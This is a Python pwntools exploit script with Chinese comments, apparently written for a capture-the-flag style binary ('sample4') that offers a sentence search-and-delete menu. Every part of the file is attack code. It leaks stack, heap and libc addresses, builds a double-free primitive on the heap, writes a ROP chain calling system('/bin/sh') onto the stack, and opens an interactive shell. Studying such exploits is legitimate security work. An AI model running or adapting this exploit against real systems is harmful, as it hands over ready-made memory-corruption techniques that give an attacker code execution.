from pwn import *
import re

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# Process / ELF / libc
p = process('./data/sample4')
elf = ELF('./data/sample4')
libc = elf.libc


# -----------------------------
# 高层交互 API（基于反编译菜单）
# -----------------------------
def wait_menu():
    p.recvuntil(b'3: Quit')


def action_index_sentence(sentence: bytes):
    wait_menu()
    p.sendline(b'2')
    p.sendline(str(len(sentence)).encode())
    p.send(sentence)


def action_search_word(word: bytes):
    wait_menu()
    p.sendline(b'1')
    p.sendline(str(len(word)).encode())
    p.send(word)


def action_answer_yes():
    p.sendline(b'y')


def action_answer_no():
    p.sendline(b'n')


def action_quit():
    wait_menu()
    p.sendline(b'3')


# 组合交互：一次搜索并按序批量回答 y/n（用于多次命中时的删除交互）
def action_search_with_answers(word: bytes, answers: list[bytes]):
    action_search_word(word)
    for ans in answers:
        if ans in (b'y', b'Y'):
            action_answer_yes()
        else:
            action_answer_no()


# -----------------------------
# 利用步骤（保持与原 exp 原理一致）
# -----------------------------
def leak_stack_ptr() -> int:
    # 利用数字读取函数的错误回显泄漏栈地址（与原始 exp 一致）
    wait_menu()
    p.send(b'a' * 96)
    p.recvuntil(b'is not a valid number')
    leak_buf = p.recvuntil(b'is not a valid number\n')
    stackptr_match = re.findall(b'a{48}(......) is not', leak_buf)
    stackptr = u64(stackptr_match[0] + b'\0\0')
    return stackptr


def leak_heap_ptr() -> int:
    # 通过索引两句包含相同关键词的句子，再以空字节检索，读取打印位置泄漏堆地址
    action_index_sentence(b'a' * 50 + b' DREAM')
    action_index_sentence(b'b' * 50 + b' DREAM')
    action_search_word(b'DREAM')
    action_answer_yes()
    action_answer_yes()
    action_search_word(b'\0' * 5)
    p.recvuntil(b'Found 56: ')
    leaked = u64(p.recvuntil(b'Delete')[:8])
    action_answer_no()
    return leaked - 0x10B0


def leak_libc_ptr() -> int:
    # 通过构造 512 字节的条目并以空字节查询，利用 main_arena+88 泄漏 libc 基址
    action_index_sentence((b'b' * 256 + b' FLOWER ').ljust(512, b'c'))
    action_search_word(b'FLOWER')
    action_answer_yes()
    action_search_word(b'\0' * 6)
    p.recvuntil(b'Found 512: ')
    mainarena_plus_88 = u64(p.recvuntil(b'Delete')[:8])
    libc_base = mainarena_plus_88 - 0x3C4B78
    action_answer_no()
    return libc_base


def perform_double_free_primitive():
    # 与原始 exp 一致的删除序列，制造堆上的双重释放相关原语
    action_index_sentence(b'a' * 51 + b' ROCK')
    action_index_sentence(b'b' * 51 + b' ROCK')
    action_index_sentence(b'c' * 51 + b' ROCK')
    action_search_word(b'ROCK')
    action_answer_yes()
    action_answer_yes()
    action_answer_yes()
    action_search_word(b'\0' * 4)
    action_answer_yes()
    action_answer_no()


def write_to_stack_and_get_shell(stackptr: int, libc_base: int):
    # 复用 MIRACLE 序列将构造写入到栈，并触发 ROP 到 system('/bin/sh')
    action_index_sentence(p64(stackptr + 0x52).ljust(48, b'\0') + b' MIRACLE')
    action_index_sentence(b'd' * 48 + b' MIRACLE')
    action_index_sentence(b'e' * 48 + b' MIRACLE')

    rop = ROP(libc)
    pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret']).address
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    system_addr = libc_base + libc.sym['system']
    exit_addr = libc_base + libc.sym['exit']

    payload = (b'A' * 6 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(exit_addr)).ljust(56, b'U')
    action_index_sentence(payload)


def main():
    stack_ptr = leak_stack_ptr()
    heap_base = leak_heap_ptr()
    log.info(f'stack_ptr = {hex(stack_ptr)}')
    log.info(f'heap_base = {hex(heap_base)}')

    libc_base = leak_libc_ptr()
    log.info(f'libc_base = {hex(libc_base)}')

    perform_double_free_primitive()
    write_to_stack_and_get_shell(stack_ptr, libc_base)
    action_quit()
    p.interactive()


if __name__ == '__main__':
    main()


